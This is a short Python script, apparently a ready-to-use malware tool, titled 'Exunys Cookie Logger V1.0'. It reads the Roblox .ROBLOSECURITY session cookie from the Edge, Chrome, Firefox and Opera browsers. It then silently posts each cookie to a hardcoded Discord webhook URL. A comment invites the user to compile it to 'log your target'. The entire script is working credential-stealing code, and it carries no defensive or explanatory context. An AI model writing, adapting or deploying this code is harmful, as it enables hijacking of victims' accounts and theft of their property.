import browser_cookie3, requests, threading

WebHook = "https://discordapp.com/api/webhooks/1370507114107371540/TuHoElylpwiInT_ZdAd8pZk_Y0vxgnF-r6FSmmkqofH_lTM8VsvIk-PiSyy9YF2e5mrA" # Input your webhook here and make sure to compile if you want to log your target

def MicrosoftEdge():
    try:
        cookies = browser_cookie3.edge(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"diamonddoodog" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()
